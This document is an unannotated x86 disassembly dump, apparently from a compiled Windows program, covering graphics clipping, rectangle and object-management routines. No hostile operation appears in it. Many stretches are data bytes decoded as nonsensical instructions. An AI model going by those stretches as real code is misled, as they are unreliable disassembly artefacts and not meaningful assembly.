mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42d18c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42cbe0
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42d327
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42d34d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d354
retn
sub_42d368
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d38d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d394
retn
sub_42d3a1
rol [ edx ] cl
prefetchw [ ecx + 0x48 ]
insb
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
xchg esp eax
adc [ eax ] eax
add [ eax - 0x6d ] ebx
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d394
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
aad 0x42
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0xd40c7265
inc edx
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
call [ eax ]
aam 0x42
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11947265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
inc eax
add [ eax - 0x23ffbfcf ] ah
jns r-xdata
pop edi
rcl [ ecx ] cl
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax + eax ] cl
add [ eax ] al
sub [ edx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2b ] cl
inc edx
outsb
je r-xdata
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
pop eax
xchg ebx eax
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
aam 0x42
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x42d3dcc0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax ] ch
jb r-xdata
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42e133
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xd4487265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
adc al 0x45
dec eax
insb
jo r-xdata
outsb
je r-xdata
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + edx * 8 ] cl
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 8 + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0xc0042d5
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
add bh bh
dec [ ebx + 0x42d4c8c0 ]
aam 0x42
add bh bh
dec [ eax + 0xf0042d4 ]
mov [ 0x4fc000b9 ] eax
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
aam 0x42
insd
xchg esp eax
adc [ eax ] eax
add [ ebx - 0x6d ] edx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42d44cc0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fd0
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0xac00408d
aad 0x42
add [ eax ] al
add [ eax ] al
jae r-xdata
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
jmp r-xdata
int3
mov eax eax
lea eax [ eax ]
dec eax
aad 0x42
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp - 0x2ab7ffc0 ]
inc edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e13a
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a04
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42c414
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058b8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42d764
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42d7da
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42d8f0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4058b8
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d7e1
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d87c
mov [ rw-data ] eax
sub_42d7e8
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d87c
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4058e4
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42d840
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4058b8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_42d87c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c3d8
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c3d8
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c3d8
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403f7c
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_42d8f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42d9f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d840
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42c428
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d548
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d548
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d840
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42c428
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d840
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42c428
mov ecx r-xdata
call sub_4058e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d9f8
lea eax [ ebp - 0xc ]
call sub_4058a0
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
sub edx 0xfffffff8
sub_42da10
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42c414
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42da50
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42c414
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42da80
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42dc12
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42c414
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42dbad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc19
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42c414
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
mov eax esi
xor edx edx
call sub_42c414
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42c414
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42c414
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42dc20
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42dd05
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403fd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dd0c
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a04
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42c414
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058b8
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42c414
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058b8
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42df3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42e02f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403fd0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e036
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a04
lea eax [ ebp - 0x10 ]
call sub_4058a0
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42c414
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4058b8
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42e054
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42e133
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fd0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e13a
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a04
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42c414
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058b8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42e154
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405914
xor eax eax
push ebp
push sub_42e1a3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4058b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e1aa
lea eax [ ebx + 0xc ]
call sub_4058a0
sub_42e1b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_42e245
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403fd0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42df3c
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e24c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax ebx
call sub_42da50
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42da80
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42dc20
sub_42e270
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42c414
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42c414
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418cb4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42c414
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_418cb4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_418cb4
sub_42e2fc
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_42da10
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_4031ec
mov eax [ esi + 0x14 ]
call sub_4031ec
mov eax [ esi + 0x10 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4058a0
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_42e350
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e387
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e38e
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42e3b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e3dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e3e4
retn
sub_42e3f4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xe4
inc edx
add [ eax + eax ] cl
add [ eax ] al
sub [ edx + 0x40 ] dh
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
or [ ebp + 0x50 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx al
outsb
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
in al 0x42
add [ eax ] dh
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah ah
out 0x42 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
jb r-xdata
cmp [ edx ] 0x20
je r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_42e3e4
retn
inc eax
add [ esp + 0x42 ] cl
add [ ebx ] al
adc edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x724f7265
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x1c ] cl
inc edx
add [ edx ] cl
jo r-xdata
inc edx
mov esi edx
jmp r-xdata
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
push eax
outsd
jb r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dl 0xe5
inc edx
add [ eax ] dl
outsb
je r-xdata
add [ eax ] bl
add [ eax ] al
add [ eax ] cl
push esp
push eax
jb r-xdata
jb r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
retn 0x8
outsb
je r-xdata
add [ eax ] al
add [ eax ] ah
